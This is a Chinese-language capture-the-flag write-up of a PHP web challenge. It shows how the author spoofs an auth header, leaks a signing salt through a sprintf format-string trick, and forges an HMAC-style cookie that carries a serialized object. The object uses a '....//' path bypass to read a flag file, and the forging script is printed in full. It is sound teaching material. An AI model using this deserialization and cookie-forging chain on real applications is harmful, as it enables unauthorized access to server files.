#### web签到题

> <http://117.51.158.44/index.php>

打开页面提示没有权限，于是F12查看一下请求记录，发现有一个Auth.php

请求这个文件的时候有一个空的报文头didictf_username，用burpsuite抓包，将该项的值设为admin提示访问app/fL2XID2i0Cdh.php

该页面给了两个文件的源代码

经过审计发现

app/Application.php实现了一个Application类，该类中的__destruct方法有读取文件的操作，文件名为类中的一个变量，如果有反序列化便可以利用

```php
public function __destruct() {
    if(empty($this->path)) {
        exit();
    }else{
        $path = $this->sanitizepath($this->path);
        if(strlen($path) !== 18) {
            exit();
        }
        $this->response($data=file_get_contents($path),'Congratulations');
    }
    exit();
}
```



app/Session.php实现了一个Session类，该类的session_read方法有一个反序列化操作，反序列化的数据是cookie中的ddctf_id的值。此时我考虑通过篡改此cookie为恶意构造的上面application类的序列化字符串，其中path改为文件中提到的flag文件，这样便可读到flag

```php
private function get_key() {
    //eancrykey  and flag under the folder
    $this->eancrykey =  file_get_contents('../config/key.txt');//这个目录不可直接访问
}
```



题目中为了防止cookie被篡改，在设置cookie["ddctf_id"]的时候，在该值的后面缀上了一段md5，验证方法如下：

```php
$hash = substr($session,strlen($session)-32);//后三十二位为MD5，剩下的部分为反序列化用到的字符串
$session = substr($session,0,strlen($session)-32);

if($hash !== md5($this->eancrykey.$session)) {
   parent::response("the cookie data not match",'error');
   return FALSE;
}
```

因此想篡改cookie的值需要拿到盐。

继续审计发现如果不篡改cookie值，那么会进入到下面这个逻辑

```php
if(!is_array($session) OR !isset($session['session_id']) OR !isset($session['ip_address']) OR !isset($session['user_agent'])){
            return FALSE;
        }

        if(!empty($_POST["nickname"])) {
            $arr = array($_POST["nickname"],$this->eancrykey);
            $data = "Welcome my friend %s";
            foreach ($arr as $k => $v) {
                $data = sprintf($data,$v);
            }
            parent::response($data,"Welcome");
        }
```

这个逻辑允许用户将自己的nickname用POST方式发送过去，然后调用sprintf格式化"Welcome my friend %s"

这里可以将nickname设为%s，这样第二次for循环的时候便可将盐格式化到里面去，然后便可拿到盐

有了盐就可以篡改cookie了

```php
//authentication.php
//获取序列化的Application类
$auth = new Application();
$auth->path= "....//config/flag.txt";//sanitizepath函数进行了过滤，不过双写即可绕过
echo serialize($auth);

//attack.php
//构造合法的cookie
<?php
$eancrykey = "EzblrbNS";
$session = 'O:11:"Application":1:{s:4:"path";s:21:"....//config/flag.txt";}'; 

echo $session.md5($eancrykey.$session);//serilized + hash
?>
```

这道题应该也可以通过长度扩展攻击来绕过对cookie合法性的校验。不过这道题可以拿到盐的值，这种做法简单一些